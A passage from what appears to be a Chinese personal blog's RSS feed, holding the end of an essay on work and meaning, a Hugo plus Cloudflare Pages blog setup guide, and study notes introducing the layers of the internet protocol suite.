&lt;p&gt;长期主义的神话逐渐成为谎言，结合这两天中金公司30岁女生跳楼的新闻，不免想起那句&lt;code&gt;时代的一粒沙，落到普通人头上就是一座山。&lt;/code&gt;父母的25岁，正好赶上改革开放，人生像是被一阵风托举着。我的25岁，经历过疫情+经济下行，底色中已经掺杂上了焦虑，以及对这个社会/政党的失望。草东没有派对是一支台湾摇滚乐队，在网易云的粉丝量为180万。而五月天这种人尽皆知的老牌乐队，粉丝量也才324万。《烂泥》《大风吹》都代表了Z时代丧、消极的精神状态，偏离主流叙事，不再相信公平与奋斗，自然也就不再相信长期主义。&lt;/p&gt;
&lt;p&gt;金钱锚定物的缺失，这一点我并没有感觉到，可能是做到了解决办法中的&lt;code&gt;将金钱具象化&lt;/code&gt;。作者的这一点想法其实和关于边际效应的一点相似，单纯的增加的钱变成了无法感受的事物&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;工作耗尽了一个人绝大部分的神经力量，而这些力量原本是可以用来沉思、冥想、做梦、担忧、去爱、去恨的。——尼采&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当欲望也被工作耗尽，金钱便不再与快乐锚定，只会成为变化的数字。&lt;/p&gt;
&lt;p&gt;空间的桎梏让人孤独，表现为大部分(互联网)打工人难以拥有wlb的生活，去构建/维护爱情、友情等亲密关系。我自己也有个观点，实际的上班并不是身处公司的时间与空间限制，也包括在这份工作上付出的焦虑、疲劳等情绪价值。设想两个人的工作时间都是8小时，A是无所事事的8小时，B是身心俱疲的8小时，那么B可能在下班后还要花2小时修复自我，那么他实际的上班时间是10小时。所以有些时候指责他人因为懒而不去做什么是不对的，你不知道他在消耗了一天之后是否还有精力去做自己的事。No judge是一种美德，尊重他人选择。与此同时在格子间内进行社交，一方面同事之间当作朋友处被定义成了职场大忌（虽然我很幸运遇到了一批关系不错的同届校招同事），另一方面年龄差距、性别差异带来的代沟无法忽视。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;人是社会关系的总和，过长的工作时间挤占了人类社交空间的同时，也削减了人类定义自我的能力。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;随后作者提出了可能的解决办法：&lt;/p&gt;
&lt;p&gt;a)表达，阅读，解明，构建&lt;/p&gt;
&lt;p&gt;表达是将自己的愤怒与焦虑释放，即便我们不是最受压迫、最痛苦的那批人，我们也有权力发表自己的感受。随后通过阅读尝试用他人的理论来构建自己关于工作的观念。这里作者提出了大卫·格雷伯在《毫无意义的工作》一书中的观念：身为原因的快感。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;人类之所以觉得自己是自主存在，是与世界和他人分离的独立体，很大程度上是因为人们觉得自己可以按照可预测的方式对世界和他人产生影响。一旦被剥夺这种拥有力量的感觉，人类就什么也不是了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这种对世界和他人的影响带来的愉悦心情被称之为“身为原因的快感”，也被认为是一种对自由本身的实践。&lt;/p&gt;
&lt;p&gt;b)重新挖掘将金钱价值具象化的方法&lt;/p&gt;
&lt;p&gt;目前我倒是挖掘得挺好的，以至于工作两年还是没存下多少钱&amp;hellip;其实就是让自己的欲望生长出来，五十块可以去电影院看一场电影，两百块可以和朋友吃一顿热热闹闹的火锅，三百块可以去剧院看一场戏剧。&lt;/p&gt;
&lt;p&gt;c)建立分布式的情感支撑系统，这一点对我的触动特别大。人是社会关系的总和，需要友情、亲情、爱情&amp;hellip;建立分布式的情感支撑系统而非集中式的，意思就是不要把某个东西放得太重。&lt;/p&gt;
&lt;p&gt;《安娜·卡列尼娜》中有一段剧情（我不久前看过此书，却完全没体会到）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“他对安娜的迷恋彻底消除了他同别人亲密交往的需求。现在，他在所有的熟人中间没有一个知心朋友。……在彼得堡的熟人中间，最亲密、最谈得来的是他的办公室主任和医生。办公室主任史留丁是个朴实、聪明、善良和有道德的人，卡列宁对他很有好感，但是五年来的同事关系在他们之间形成了一道鸿沟，妨碍他们推心置腹地交谈。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;卡列宁对安娜的迷恋彻底消除了他同别人亲密交往的需求，以至于当他生活发生巨变的时候无人可倾诉。有趣的是，在书中，安娜和另一位角色列文在人格和灵魂上如此相似（情感丰富而热烈），但是最后却又拥有截然不同的结局：列文在失意时，可以和农民们一起干农活、可以写书、可以参与政治，可是安娜却只能紧紧抓住伏伦斯基，从而走向悲剧。不只是爱情，还有亲情、友情、工作、爱好以及一切。毕竟，离别是人生的永恒主题之一。&lt;/p&gt;
&lt;p&gt;其次，尝试去做一个自私的好人。即使是出于一种自私的目的&amp;quot;让自己感觉好点&amp;quot;，去关爱他人也是一件值得去做的事。让我想起了某位朋友，尝试将自己”溢出“的幸福分给他人。&lt;/p&gt;
&lt;p&gt;d)将工作当成达成目的的手段而非目的本身。&lt;/p&gt;
&lt;p&gt;作者认为当实在无法从工作者获得意义的时候，或许正确的应对手段，是放弃把工作作为目的本身，而是把它作为一种达成目的的手段，获得资金和人脉的积累，获得经验，为了某一天去做自己真正想做的事。&lt;/p&gt;
&lt;p&gt;目前我对于自己的工作还是有一点小小的成就感，所以暂时无法认同。虽然有时这种成就感不能持续，也还没有将其作为毕生的事业，但一直在努力探索发散出自己的应许之地。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Hugo&#43;CloudFlare搭建博客指南</title>
      <link>https://wander1ng.com/post/hugo&#43;cloudflare%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%8C%87%E5%8D%97/</link>
      <pubDate>Thu, 27 Jun 2024 18:02:59 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/hugo&#43;cloudflare%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%8C%87%E5%8D%97/</guid>
      <description>&lt;p&gt;1.首先创建Github库&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705001618.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;2.安装hugo：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://github.com/gohugoio/hugo/releases
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.下载后记得将hugo.exe路径加入系统环境变量，测试是否安装成功：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;hugo version
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;4.使用hugo创建博客目录&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;hugo new site blogname
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;5.在系统中创建博客目录，并&lt;code&gt;git init&lt;/code&gt;，配置好git的config文件。&lt;/p&gt;
&lt;p&gt;6.选择hugo主题，并使用git clone将主题下载到本地，本网站选择的主题是&lt;code&gt;https://github.com/heyeshuang/hugo-theme-tokiwa.git&lt;/code&gt;，第一眼看到便想到莫奈的《日出·印象》。&lt;/p&gt;
&lt;p&gt;7.新建文章&lt;/p&gt;
&lt;p&gt;&lt;code&gt;hugo new post/first-post.md&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;8.在hugo网站的根目录下执行&lt;code&gt;hugo&lt;/code&gt;进行编译，启动本地预览,打开网址 http://localhost:1313/ 可以进行预览&lt;code&gt;hugo server -D&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;9.部署到GitHub&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git add .
git commit -m &amp;#34;xxx&amp;#34;
git push https://github.com/username/projectname master(main)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;10.在Godaddy或其他网站购买域名&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705005703.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;11.将域名托管到Cloudflare，左边导航栏进入Websites&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705005944.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;add site&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705010027.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;记得选free plan&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705010033.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;随后在Godaddy设置域名DNS为Cloudflare的DNS服务器地址&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705010351.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;随后等待DNS解析成功，邮箱将会收到邮件通知&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705010400.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;在Cloudflare创建pages并连接到Git，选择最开始在Git中新建的blog目录&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705011021.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;随后博客文件将部署到Cloudflare上&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705011256.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后自定义域名，即将域名DNS记录指向Pages&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705011654.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;踩的坑&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Hugo server -D的意思是忽略draft=true，即draft属性为true的md文件也会被渲染编译。折磨了一天的问题是“为什么本地能够编译出文章，但是部署到Github上就消失了？”因为实际部署的时候draft=true的文件是不显示的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;域名的CNAME要解析到项目的别名/Aliases，一键交给Cloudflare添加的CNAME可能不是实际的Aliases，需要手动修改DNS添加上master。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705012026.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>互联网协议入门</title>
      <link>https://wander1ng.com/post/%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8/</link>
      <pubDate>Thu, 16 Jul 2020 15:24:35 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8/</guid>
      <description>&lt;p&gt;学计网的时候有些头大,找到了这篇文章,首先对整体有一个认识,再换一本书,机械工业出版社的《Computer Networking A Top-Down Approach》.&lt;/p&gt;
&lt;h4 id=&#34;序&#34;&gt;序&lt;/h4&gt;
&lt;p&gt;互联网的核心是一系列协议,总称为互联网协议:Internet Protocol Suite.它们对电脑如何连接和组网,做出了详尽的规定.理解了这些协议的规定,就理解了互联网的原理.&lt;/p&gt;
&lt;h4 id=&#34;概述&#34;&gt;概述&lt;/h4&gt;
&lt;h5 id=&#34;五层模型&#34;&gt;五层模型&lt;/h5&gt;
&lt;p&gt;自顶向下分别为应用层Application Layer,传输层Transport Layer,网络层Network Layer,链路层Link Layer和物理层Physical Layer.越下面的层越靠近硬件,越上面的层越靠近用户.&lt;/p&gt;
&lt;h5 id=&#34;层与协议&#34;&gt;层与协议&lt;/h5&gt;
&lt;p&gt;每一层都是为了完成某一种功能,为了实现这些功能就要传输时遵循共同的规则protocol.互联网的每一层都定义了很多协议,这些协议的总称为互联网协议.&lt;/p&gt;
&lt;h4 id=&#34;物理层&#34;&gt;物理层&lt;/h4&gt;
&lt;p&gt;电脑要组网,首先就要先把电脑连接起来,可以用光缆,线缆,双绞线和无线电波等方式(咋和谢希仁版有点不一样?还是我记错了).这就叫做物理层.&lt;strong&gt;它主要规定了网络的一些电气特性,作用是负责传输0和1的电信号.&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;链路层&#34;&gt;链路层&lt;/h4&gt;
&lt;h5 id=&#34;定义&#34;&gt;定义&lt;/h5&gt;
&lt;p&gt;单纯的0和1并没有意义,必须规定其解读方式:多少个电信号算一组,每个信号有何意义?&lt;strong&gt;链路层的功能就是在实体层的上方确定0和1的分组方式.&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&#34;以太网协议&#34;&gt;以太网协议&lt;/h5&gt;
&lt;p&gt;Ethernet规定,一组电信号构成一个数据包叫做帧(Frame).每一帧分为两个部分:标头Head与数据Data.Head包含数据包的一些说明项,如发送者,接收者,数据类型.数据则是数据包的具体内容.&lt;/p&gt;
&lt;p&gt;标头的长度固定为18字节,数据的长度最短为46字节,最长为1500字节.因此对于一帧来说,大小区间为64-1518字节.数据过长则分为多个帧发送.&lt;/p&gt;
&lt;h5 id=&#34;mac地址&#34;&gt;MAC地址&lt;/h5&gt;
&lt;p&gt;传输数据的过程中要标识发送者与接收者,就要使用到MAC地址.Ethernet规定连入网络的所有设备都必须有网卡接口,**数据包必须是从一块网卡传送到另一块网卡.网卡的地址就是数据包的发送地址与接收地址即MAC地址.**每块网卡出场时都有一个唯一的MAC地址,长度为48个二进制位,常用12个16进制数表示.前6个位厂商编号,后六个为该厂商网卡流水号.&lt;/p&gt;
&lt;h5 id=&#34;广播&#34;&gt;广播&lt;/h5&gt;
&lt;p&gt;一块网卡要知道另一块网卡的MAC地址,要使用到ARP协议(在谢希仁版中自学过,现在又给忘了&amp;hellip;);&lt;/p&gt;
&lt;p&gt;知道MAC地址之后,系统怎样才能把数据包准确送到接收方?**Ethernet并不把数据包准确送到接收方,而是向本网络所有计算机发送,让计算机自己判断是否为接收方.**而向本网络所有计算机发包的行为,就叫做广播broadcasting.&lt;/p&gt;
&lt;h4 id=&#34;网络层&#34;&gt;网络层&lt;/h4&gt;
&lt;h5 id=&#34;网络层的由来&#34;&gt;网络层的由来&lt;/h5&gt;
&lt;p&gt;根据Ethernet协议,依靠MAC地址发送数据,理论上和技术上世界上任何一个地方的网卡都能够找到任何一个地方的网卡.但是这样做有一个巨大的缺点&amp;quot;&lt;strong&gt;以太网采用广播的方式发送数据包,每个成员都会收到所有的包.不仅效率低,而且只能在发送者的子网络中传播.(如果互联网上每一台计算机都收到所有的包不可想象)&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;所以必须找到一种方法,能够区分MAC地址是否属于一个子网络.如果属于一个子网络,采用广播的形式发送,否则采用路由(路由即向不同的子网络分发数据包).而MAC地址只与厂商有关与网络无关,所以网络层诞生了.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它的作用是引进一套新的地址,使我们能够区分不同的计算机是否属于一个子网络.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;于是网络层出现后,每台计算机就有了两种地址,一种是MAC地址,另一种是网络地址(二者之间无任何联系).网络地址帮助我们确定计算机所在的子网络,MAC地址则将数据包送到该子网络的目标网卡.所以从逻辑上看一定是先处理网络地址,再处理MAC地址.&lt;/p&gt;
&lt;h5 id=&#34;ip协议&#34;&gt;IP协议&lt;/h5&gt;
&lt;p&gt;根据网络地址的协议就叫做IP协议,其定义的地址就叫做IP地址.IP地址由网络号和主机号组成.&lt;strong&gt;处于一个子网络的电脑,其IP地址的网络部分必定是相同的.主机部分是对同处该子网的主机进行编号.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;为了从IP地址判断出两台计算机是否处于同一个子网,就要用到另一个参数&amp;quot;&lt;strong&gt;子网掩码&lt;/strong&gt;&amp;ldquo;即subnet mask.子网掩码使表示子网特征的一个参数,在形式上等同于IP地址,也是一个32位二进制数字.&lt;strong&gt;其网络部分全为1,主机部分全为0.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;知道IP地址与子网掩码判断是否属于同一个子网的方法:将两个IP地址分别于子网掩码进行AND运算,结果相同则在一个子网.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;已知IP地址172.16.154.1和172.16.254.233子网掩码都是255.255.255.0,请问其是否在一个子网?&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;总结IP协议的作用:一是为每台计算机分配IP地址,另一个是为确定哪些地址处于一个子网.&lt;/p&gt;
&lt;h5 id=&#34;ip数据报&#34;&gt;IP数据报&lt;/h5&gt;
&lt;p&gt;根据IP协议发送的数据,就叫做IP数据报.但是Ethernet数据报只包含MAC地址,并没有IP地址的栏位,是否要修改数据报定义,再添加一个栏位?回答是不需要,因为可以直接将IP数据报放进Ethernet数据报的数据部分.这就是互联网分层结构的好处:上层变动完全不涉及下层结构.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/20120531_153208_10.jpg&#34; alt=&#34;IP数据报&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/20120531_153209_11.jpg&#34; alt=&#34;包含IP数据报的Ethernet数据报&#34;&gt;&lt;/p&gt;
&lt;p&gt;IP数据报的标头(特指不在Head中而在Data中的关于IP信息的Head)长度一般在20-60字节,整个数据报的长度最大为65535字节.Ethernet数据报的数据部分,最长只有1500字节,所以如果IP数据报超过了1500字节,就要分割成几个Ethernet数据报分开发送.&lt;/p&gt;
&lt;h5 id=&#34;arp协议&#34;&gt;ARP协议&lt;/h5&gt;
&lt;p&gt;IP数据报是放在以太网数据报里发送的.所以必须同时知道两个地址,一个是对方的MAC地址,一个是对方的IP地址.通常情况下对方的IP地址是已知的,但是MAC地址未知.所以需要一种基址从IP地址得到MAC地址.&lt;/p&gt;
&lt;p&gt;第一种情况,两个主机不在一个子网,则事实上无法得到对方的MAC地址,只能将数据包传送到两个子网连接处的网关,让网关进行处理.&lt;/p&gt;
&lt;p&gt;第二种情况,两个主机在一个子网,则使用ARP协议.&lt;strong&gt;ARP协议发出一个数据报,其中包含所要查询的IP地址,在对方的MAC地址这一栏,填的是FF:FF:FF:FF:FF:FF,表示这是一个广播地址.他所在的子网络的每一台主机,都会收到这个数据报.从中取出IP地址,与自身IP地址进行比较,如果两者相同,则做出回复向对方报告MAC地址,否则就丢弃这个包.&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;传输层&#34;&gt;传输层&lt;/h4&gt;
&lt;p&gt;有了MAC地址和IP地址,就可以在互联网上任意两台主机建立通信.但是同一台主机上有许多程序都要使用到网络,那么就需要一个参数来表示这个数据包到底供哪个进程使用,这个参数就叫做端口.&lt;strong&gt;它其实是每一个使用网卡的程序的编号,每个数据报都发送到主机的特定端口,这样不同的程序就能够取到自己所需要的数据.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;端口是0到65535之间的一个整数,正好16个二进制位.&lt;strong&gt;0到1023的端口被系统占用,用户只能选择大于1023的端口.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;传输层的功能是建立端口到端口之间的通信,相比之下网络层是建立主机到主机之间的通信.只要确定主机和端口,就能实现程序之间的交流.&lt;strong&gt;因此Unix就把主机+端口,叫做&amp;quot;套接字&amp;quot;socket.&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&#34;udp协议&#34;&gt;UDP协议&lt;/h5&gt;
&lt;p&gt;现在我们要在数据报中加入端口信息,这就需要新的协议.最简单的实现叫做UDP协议,它的格式就是在数据前面加上端口号.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/20120531_153209_12.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Head部分主要定义了&lt;strong&gt;发出端口&lt;/strong&gt;与&lt;strong&gt;接收接口&lt;/strong&gt;,其数据报非常简单,Head部分8个字节,总长度不超过65535字节,正好放进一个IP数据报.数据部分就是具体的内容然后把整个UDP数据报放入IP数据报的数据部分.所以整个Ethernet数据报变成了下面这样:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/20120531_153209_13.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;tcp协议&#34;&gt;TCP协议&lt;/h5&gt;
&lt;p&gt;UDP协议的优点在于比较简单,容易实现.但是缺点在于一旦数据报发出,无法知道对方是否知道.为了提高网络可靠性,TCP协议就诞生了.这个协议非常复杂,但可以近似认为它是有确认机制的.因此TCP协议能够确保数据不会丢失,但是实现困难,资源消耗较多.&lt;/p&gt;
&lt;p&gt;TCP数据报和UDP数据报一样,都是内嵌在IP数据报的数据部分.TCP数据报没有长度限制,理论上可以无限长.但是为了保证网络的效率,通常TCP数据报的长度不会超过IP数据报的长度,确保单个TCP数据报不必再被分割.&lt;/p&gt;
&lt;h4 id=&#34;应用层&#34;&gt;应用层&lt;/h4&gt;
&lt;p&gt;应用程序收到传输层的数据,接下来就要进行解读.由于互联网是开放架构,所以必须先规定好格式.**应用层的作用,就是规定应用程序的数据格式.**举例来说,TCP协议可以为各种各样的程序传递数据,Email/WWW/FTP等,必须有不同协议规定电子邮电,网页和FTP数据的格式,这些应用程序协议就构成了应用层.这是最高的一层,直接面对用户.其数据就在TCP数据报的数据部分,因此现在的Ethernet变成了下面这样:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/20120531_153209_14.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;网络通信的实质就是交换上面的数据报.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/2024070401.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;对于不在一个子网的两台计算机之间的通信(假设1号电脑要向4号电脑发送数据报),则1号电脑需要知道网关A的MAC地址(和4号电脑的IP地址).1号电脑发出数据报到网关A,网关A通过&lt;strong&gt;路由协议&lt;/strong&gt;发现4号电脑位于网络B,又把数据报发给网关B,B再转发到4号电脑.&lt;/p&gt;
&lt;h4 id=&#34;判断是否处于同一子网的方法&#34;&gt;判断是否处于同一子网的方法&lt;/h4&gt;
&lt;h5 id=&#34;静态ip地址&#34;&gt;静态IP地址&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;本机IP地址&lt;/strong&gt;,&lt;strong&gt;子网掩码&lt;/strong&gt;,&lt;strong&gt;网关IP地址&lt;/strong&gt;,&lt;strong&gt;DNS的IP地址&lt;/strong&gt;是TCP/IP协议的重要参数,通俗来说知道它们就可以上网.由于它们是给定的,计算机每次开机都分配到相同的IP地址,&lt;strong&gt;所以这种方法被称作静态IP地址上网.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;但是出于简便性,并且避免IP地址无法灵活变更,大多数用户使用&amp;quot;动态IP上网&amp;rdquo;.&lt;/p&gt;
&lt;h5 id=&#34;动态ip地址&#34;&gt;动态IP地址&lt;/h5&gt;
&lt;p&gt;计算机开机后会自动分配到一个IP地址,不用人为设定,它们使用的协议叫做DHCP协议.该协议规定每个子网中都有一台计算机负责管理本网络的所有IP地址,叫做DHCP服务器.&lt;strong&gt;新的计算机加入网络,必须向DHCP服务器发送一个DHCP请求数据报,申请IP地址和相关的网络参数&lt;/strong&gt;.(指定管理IP地址的DHCP服务器未开机怎么办????)&lt;/p&gt;
&lt;p&gt;新加入的计算机不知道不同子网计算机的MAC地址和IP地址,如何发送数据报?DHCP协议作出了巧妙规定:&lt;/p&gt;
&lt;p&gt;由于DHCP是一种建立在UDP协议基础上的应用层协议,所以整个数据报长这个样子:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/2024070402.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;最前面的Ethernet Head,设置发出方的MAC地址和接收方(DHCP服务器)的MAC地址,前者就是本机网卡的MAC地址,后者此时不知道,填入广播地址FF:FF:FF:FF&lt;/p&gt;
&lt;p&gt;后面的IP Head,设置发出方的IP地址和接收方的IP地址,这时对于这两者本机都不知道,于是发出方的IP地址设为0.0.0.0,接收方IP地址设为255.255.255.255&lt;/p&gt;
&lt;p&gt;最后的UDP Head,设置发出方的端口和接收方的端口.DHCP协议规定发出方是port 68,接收方是port 67.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个数据包构造完成后，就可以发出了。以太网是广播发送，同一个子网络的每台计算机都收到了这个包。因为接收方的MAC地址是FF-FF-FF-FF-FF-FF，看不出是发给谁的，所以每台收到这个包的计算机，还必须分析这个包的IP地址，才能确定是不是发给自己的。当看到发出方IP地址是0.0.0.0，接收方是255.255.255.255，于是DHCP服务器知道”这个包是发给我的”，而其他计算机就可以丢弃这个包。&lt;/p&gt;
&lt;p&gt;接下来，DHCP服务器读出这个包的数据内容，分配好IP地址，发送回去一个”DHCP响应”数据包。这个响应包的结构也是类似的，以太网标头的MAC地址是双方的网卡地址，IP标头的IP地址是DHCP服务器的IP地址（发出方）和255.255.255.255（接收方），UDP标头的端口是67（发出方）和68（接收方），分配给请求端的IP地址和本网络的具体参数则包含在Data部分。新加入的计算机收到这个响应包，于是就知道了自己的IP地址、子网掩码、网关地址、DNS服务器等等参数。&lt;/p&gt;
&lt;h2 id=&#34;实例&#34;&gt;实例&lt;/h2&gt;
&lt;p&gt;假设网络参数如下:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;本机IP:192.168.1.100,子网掩码255.255.255.0,网关IP:192.168.1.1,DNS的IP地址:8.8.8.8&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后打开了Google Chrome,输入了www.google.com,接下来浏览器将要向Google发送一个网页请求数据报.&lt;/p&gt;
&lt;h5 id=&#34;dns协议&#34;&gt;DNS协议&lt;/h5&gt;
&lt;p&gt;发送数据报就要知道对方的IP地址,我么可以通过DNS协议将网址转换为IP地址.已知DNS服务器为8.8.8.8,于是向其发送DNS数据报(port 53):&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/2024070403.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后DNS服务器做出响应,告诉我们Google服务器的IP地址172.194.72.105.&lt;/p&gt;
&lt;h5 id=&#34;子网掩码&#34;&gt;子网掩码&lt;/h5&gt;
&lt;p&gt;得到IP地址后要通过子网掩码来判断改IP是否在同一个子网,以确定要不要向网关发包.将子网掩码与自己的IP地址和Google的IP地址进行AND运算,发现结果不相等,所以不在一个子网.&lt;strong&gt;所以我们要向Google发送数据报,必须通过网关192.168.1.1转发,也就是说接收方的IP地址将是网关的MAC地址.&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&#34;应用层协议&#34;&gt;应用层协议&lt;/h5&gt;
&lt;p&gt;浏览网页用到的是HTTP协议,它的数据报长下面这个样子:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/2024070404.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;　　GET / HTTP/1.1
　Host: &lt;a href=&#34;https://www.google.com&#34;&gt;www.google.com&lt;/a&gt;
　Connection: keep-alive
　User-Agent: Mozilla/5.0 (Windows NT 6.1) ……
　Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&lt;em&gt;/&lt;/em&gt;;q=0.8
　Accept-Encoding: gzip,deflate,sdch
　Accept-Language: zh-CN,zh;q=0.8
　Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
　Cookie: … …&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;被嵌在TCP数据报之中,假定为4960字节.&lt;/p&gt;
&lt;h5 id=&#34;tcp协议-1&#34;&gt;TCP协议&lt;/h5&gt;
&lt;p&gt;TCP数据报需要设置端口,接收方的HTTP默认端口是80,而发送方的端口是1024-65535之间随机确定的.    假定为51775.TCP数据报的Head长为20字节,加上嵌入HTTP的数据报,总长度变为4980字节.&lt;/p&gt;
&lt;h5 id=&#34;ip协议-1&#34;&gt;IP协议&lt;/h5&gt;
